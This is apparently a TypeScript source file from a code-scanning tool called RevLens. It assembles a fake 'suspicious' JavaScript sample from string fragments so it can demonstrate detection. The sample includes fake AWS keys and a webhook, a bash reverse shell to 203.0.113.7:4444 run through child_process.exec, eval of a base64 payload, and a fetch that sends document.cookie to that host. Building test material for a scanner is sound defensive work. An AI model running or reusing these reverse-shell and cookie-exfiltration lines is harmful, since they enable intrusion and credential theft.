/**
 * The suspicious demo is assembled at run time from pieces so no real looking secret
 * ever sits in the repository. None of these values work anywhere.
 */
export function suspiciousDemo(): Uint8Array {
  const j = (...p: string[]) => p.join('');
  const keyId = j('AK', 'IA', 'Z7Q2', 'REVLENS', 'DEMO0');
  const secret = j('wJalr', 'XUtnFEMI', '/K7MDENG', '/bPxRfiCY', 'REVLENSDEMOKEY00', '0');
  const hook = j('https://hooks.', 'slack.com/services/', 'T0REVLENS', '/B0DEMO000', '/', 'notARealWebhookToken');
  const shell = j('bash -i >& ', '/dev/tcp/', '203.0.113.7', '/4444 0>&1');
  const payload = btoa('console.log("this would be a hidden payload")');
  const src = [
    '// suspicious-demo.js: generated by RevLens for the demo. Every value below is fake.',
    `const config = { region: "us-east-1", accessKeyId: "${keyId}" };`,
    `const aws_secret_access_key = "${secret}";`,
    `const webhook = "${hook}";`,
    `function phoneHome(data) { return fetch(webhook, { method: "POST", body: JSON.stringify(data) }); }`,
    `eval(atob("${payload}"));`,
    `const backdoor = "${shell}";`,
    `require("child_process").exec(backdoor);`,
    `fetch("http://203.0.113.7/api/v1/collect?id=" + document.cookie);`,
    '',
  ].join('\n');
  return new TextEncoder().encode(src);
}

export async function loadSample(s: Sample): Promise<Uint8Array> {
  if (s.id === 'suspicious') return suspiciousDemo();
  const r = await fetch(`${import.meta.env.BASE_URL}samples/${s.file}`);
  if (!r.ok) throw new Error(`Could not load the sample ${s.file} (HTTP ${r.status}).`);
  return new Uint8Array(await r.arrayBuffer());
}
